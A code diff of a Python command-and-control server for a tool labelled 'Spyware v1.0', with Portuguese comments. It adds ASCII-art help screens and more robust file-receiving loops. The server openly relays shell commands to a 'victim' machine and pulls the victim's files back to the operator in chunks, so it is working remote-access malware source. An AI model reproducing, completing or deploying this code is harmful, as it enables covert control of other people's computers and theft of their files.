@@ -1,13 +1,43 @@
 import socket
 import selectors
 import sys
+import os
 import time
 
 _HOST = '192.168.100.165'
 _PORT = 9991
-_MAX_MSG_SIZE = 8192
+_MAX_MSG_SIZE = 4096 # estava 8192
 
 _PORT = int(sys.argv[1])
+
+
+
+def help():
+    os.system('cls||clear')
+    print(
+'{}█████████████████████████████████████████████████████████████████████████████████████████████\n'
+  '██████████████████▀▀▀░░░░░░░▀▀▀█████████████████Spyware v1.0██████████████████████████████████\n'
+  '███████████████▀░░░░░░░░░░░░░░░░░▀████████████████████socket.py████████████████████████████████\n'
+  '██████████████│░░░░░░░░░░░░░░░░░░░│█████████████████████████████████████████████████████████████\n'
+  '█████████████▌│░░░░░░░░░░░░░░░░░░░│▐█████████████████████████████████████████████████████████████\n'
+  '█████████████░└┐░░░░░░░░░░░░░░░░░┌┘░██████/msg <Mensagem> -> Envia uma Mensagem███████████████████\n'
+  '█████████████░░└┐░░░░░░░░░░░░░░░┌┘░░███████████████████████████████████████████████████████████████\n'
+  '█████████████░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██████/cmd <Comando>  -> Envia comandos a máquina██████████████\n'
+  '█████████████▌░│██████▌░░░▐██████│░▐██████da vitima OBS: Os comandos mudam conforme o██████████████\n'
+  '██████████████░│▐███▀▀░░▄░░▀▀███▌│░███████sistema operacional da vitima.███████████████████████████\n'
+  '█████████████▀─┘░░░░░░░▐█▌░░░░░░░└─▀███████████████████████████████semelhante a um ssh█████████████\n'
+  '█████████████▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄███████████████████████████████primitivo...████████████████████\n'
+  '███████████████▄─┘██▌░░░░░░░▐██└─▄█████████████████████████████████████████████████████████████████\n'
+  '████████████████░░▐█─┬┬┬┬┬┬┬─█▌░░█████████/cmd cpy <Nome do Arquivo> -> Copia o arquivo████████████\n'
+  '███████████████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████████da máquina da vitima para a sua.████████████████████████\n'
+  '████████████████▄░░░└┴┴┴┴┴┴┴┘░░░▄████████████████████████████████████████████████████████████████\n'
+  '██████████████████▄░░░░░░░░░░░▄███████████/help -> Exibe essa tela novamente.███████████████████\n'
+  '█████████████████████▄▄▄▄▄▄▄███████████████████████████████████████████████████████████████████\n'
+  '██████████████████████████████████████████/exit -> Fecha o servidor.██████████████████████████\n'
+  '█████████████████████████████████████████████████████████████████████████████████████████████{}\n{}'.format(cores['red'], cores['green'] , 'Digite:', cores['yellow']))
+
+
+
 
 if __name__ == "__main__":
     sel = None
@@ -24,8 +54,10 @@ if __name__ == "__main__":
         'limpa':'\033[m',
         'red':'\033[31m',
         'green':'\033[32m',
-        'blue':'\033[34m'
+        'yellow':'\033[33m'
     }
+
+    help()
 
     # Iniciando o seletor como padrão
     sel = selectors.DefaultSelector()
@@ -40,7 +72,7 @@ if __name__ == "__main__":
     # Registrando o 'stdin' (usuário digitando) com o selector
     sel.register(sys.stdin.fileno(), selectors.EVENT_READ)
 
-    print('{}Servidor Iniciado...{}'.format(cores['green'], cores['limpa']))
+    print('{}Servidor Iniciado...{}'.format(cores['green'], cores['yellow']))
 
     #################################
     # Loop Principal
@@ -56,16 +88,33 @@ if __name__ == "__main__":
                     conn, addr = soc.accept()
                     conn.setblocking(False)
                     sel.register(conn, selectors.EVENT_READ)
-                    print('{}Nova conexão > {}{}'.format(cores['green'], key.fileobj, cores['limpa']))
+                    print('{}Nova conexão > {}{}'.format(cores['green'], key.fileobj, cores['yellow']))
 
                 # Se o Usuario Digitou Algo
                 elif key.fileobj == sys.stdin.fileno():
                     data = sys.stdin.readline() # Substitui o input (bloqueante)
 
+                    # se for Mensagem
                     if data[:4] == '/msg':
                         conn.send(('msg' + data[5:]).encode())
 
+
+
+                    # Se for Help
+                    if data[:5] == '/help':
+                        help()
+
+
+
                     elif data[:5] == '/exit':
+                        os.system('cls||clear')
+                        print('\n'
+                              '{}█████████████░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██████████████████████████████████████████████████████████████\n'
+                                '█████████████▌░│██████▌░░░▐██████│░▐████████████Spyware v1.0███████████████████████████████████████\n'
+                                '██████████████░│▐███▀▀░░▄░░▀▀███▌│░███████████████████socket.py████████████████████████████████████\n'
+                                '█████████████▀─┘░░░░░░░▐█▌░░░░░░░└─▀██████████████████████████████████████████████████████████████{}\n'
+                              '{}\n'.format(cores['red'], cores['green'], 'Até mais... Espero vê-lo em breve :)', cores['yellow']))
+
                         sel.unregister(conn)
                         conn.close()
                         ext = True
@@ -77,10 +126,11 @@ if __name__ == "__main__":
                         if data[5:8] == 'cpy':
                             conn.send(('cmdcpy' + data[9:]).encode())
                             name_arq = (data[9:len(data)-1])
-                            print('{}Arquivo Selecionado > {}{}'.format(cores['blue'], cores['green'], name_arq, cores['limpa']))
+                            print('{}Arquivo Selecionado > {}{}'.format(cores['red'], cores['green'], name_arq, cores['yellow']))
                             # Abrindo arquivo com mesmo nome e guardando na posição 1
                             recv_files[0] = open(name_arq, 'wb')
                             recv_files[1] = None
+                            print('{}Recebendo Arquivo...{}'.format(cores['red'], cores['yellow']))
                         else:
                             # Se for comandos "normais"
                             conn.send(('cmd' + data[5:]).encode())
@@ -119,7 +169,7 @@ if __name__ == "__main__":
 
                                 # Verificação de sanidade, este código não deveria ser executado
                                 if code != 'FIL':
-                                    print('{}Recebemos algo errado!{}'.format(cores['red'], cores['limpa']))
+                                    print('{}Recebemos algo errado!{}'.format(cores['red'], cores['yellow']))
 
                                 # Encontrando o tamanho do chunk
                                 csize = int(data[3:6].decode())
@@ -132,20 +182,28 @@ if __name__ == "__main__":
                                     data = data[6 + csize:]    # Atualizando a data
                                     recv_files[0].write(chunk) # Escrevendo no arquivo
                                 else:
-                                    # É necessário receber mais dados
-                                    chunk = data[6:]
-                                    data = key.fileobj.recv(csize - len(chunk))
-                                    #print('A LEN CHUNK: {} e LEN DATA: {}\n\n'.format(len(chunk), len(data)))
-                                    recv_files[0].write(chunk)
-                                    recv_files[0].write(data)
-                                    data = ''
+                                    while True:
+                                        try:
+                                            #print('ELSE')
+                                            # É necessário receber mais dados
+                                            chunk = data[6:]
+                                            #time.sleep(0.01)
+                                            data = key.fileobj.recv(csize - len(chunk)) # Aqui fazemos um try para caso ele não consiga receber, ele fica em espera até conseguir.
+                                            #print('A LEN CHUNK: {} e LEN DATA: {}\n\n'.format(len(chunk), len(data)))
+                                            recv_files[0].write(chunk)
+                                            recv_files[0].write(data)
+                                            data = ''
+                                            break
+                                        except:
+                                            #print('Aguardando conexão...')
+                                            time.sleep(1e-2)
 
                                 # Atualizando dados já recebidos
                                 recv_files[1] = recv_files[1] - csize
 
                             if recv_files[1] <= 0:
                                 recv_files[0].close()
-                                print('{}Arquivo recebido (em uma mensagem)!{}'.format(cores['green'], cores['limpa']))
+                                print('{}Arquivo recebido (em uma mensagem)!{}'.format(cores['green'], cores['yellow']))
 
                         else:
                             # else recv_files[1] != None
@@ -159,7 +217,7 @@ if __name__ == "__main__":
 
                                 # Verificação de sanidade, este código não deveria ser executado
                                 if code != 'FIL':
-                                    print('{}Recebemos algo errado!{}'.format(cores['red'], cores['limpa']))
+                                    print('{}Recebemos algo errado!{}'.format(cores['red'], cores['yellow']))
 
                                 # Encontrando o tamanho do chunk
                                 csize = int(data[3:6].decode())
@@ -174,39 +232,50 @@ if __name__ == "__main__":
                                     data = data[6 + csize:]    # Atualizando a data
                                     recv_files[0].write(chunk) # Escrevendo no arquivo
                                 else:
-                                    #print('ELSE')
-                                    # É necessário receber mais dados
-                                    chunk = data[6:]
-                                    time.sleep(0.01)
-                                    data = key.fileobj.recv(csize - len(chunk)) # Aqui fazemos um try para caso ele não consiga receber, ele fica em espera até conseguir.
-                                    #print('B LEN CHUNK: {} e LEN DATA: {}\n\n'.format(len(chunk), len(data)))
-                                    recv_files[0].write(chunk)
-                                    recv_files[0].write(data)
-                                    data = ''
+                                    while True:
+                                        try:
+                                            #print('ELSE')
+                                            # É necessário receber mais dados
+                                            chunk = data[6:]
+                                            #time.sleep(0.01)
+                                            data = key.fileobj.recv(csize - len(chunk)) # Aqui fazemos um try para caso ele não consiga receber, ele fica em espera até conseguir.
+                                            #print('B LEN CHUNK: {} e LEN DATA: {}\n\n'.format(len(chunk), len(data)))
+                                            recv_files[0].write(chunk)
+                                            recv_files[0].write(data)
+                                            data = ''
+                                            break
+                                        except:
+                                            #print('Aguardando conexão...')
+                                            time.sleep(1e-2)
 
                                 # Atualizando dados já recebidos
                                 recv_files[1] = recv_files[1] - csize
 
                             if recv_files[1] <= 0:
                                 recv_files[0].close()
-                                print('{}Arquivo recebido! (em várias mensagens){}'.format(cores['green'], cores['limpa']))
+                                print('{}Arquivo recebido! (em várias mensagens){}'.format(cores['green'], cores['yellow']))
 
                     # Se não for arquivo, ele mostra a resposta do cliente
                     else:
                         if not data:
-                            print('{}Cliente Desconectado > {}{}'.format(cores['red'], conn, cores['limpa']))
+                            print('{}Cliente Desconectado > {}{}'.format(cores['red'], conn, cores['yellow']))
                             sel.unregister(conn)
                             conn.close()
                             break
 
+                        os.system('cls||clear')
                         print('\n'
-                              '{}<<<===== Spyware (@) =====>>> {}\n'
-                              '{}\n'.format(cores['blue'], cores['green'], data.decode(), cores['limpa']))
+                              '{}█████████████░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██████████████████████████████████████████████████████████████\n'
+                                '█████████████▌░│██████▌░░░▐██████│░▐████████████Spyware v1.0███████████████████████████████████████\n'
+                                '██████████████░│▐███▀▀░░▄░░▀▀███▌│░███████████████████socket.py████████████████████████████████████\n'
+                                '█████████████▀─┘░░░░░░░▐█▌░░░░░░░└─▀██████████████████████████████████████████████████████████████{}\n'
+                              '{}\n{}'.format(cores['red'], cores['green'], data.decode(), cores['yellow']))
+
         except OSError as error:
             if ext == True:
                 exit()
                 break
             # Isso não irá desconectar os clientes... eu acho...
-            print('{}Error: Reiniciando Servidor!!!{}'.format(cores['red'], cores['limpa']))
+            print('{}Error: Reiniciando Servidor!!!{}'.format(cores['red'], cores['yellow']))
             print(str(error))
             continue
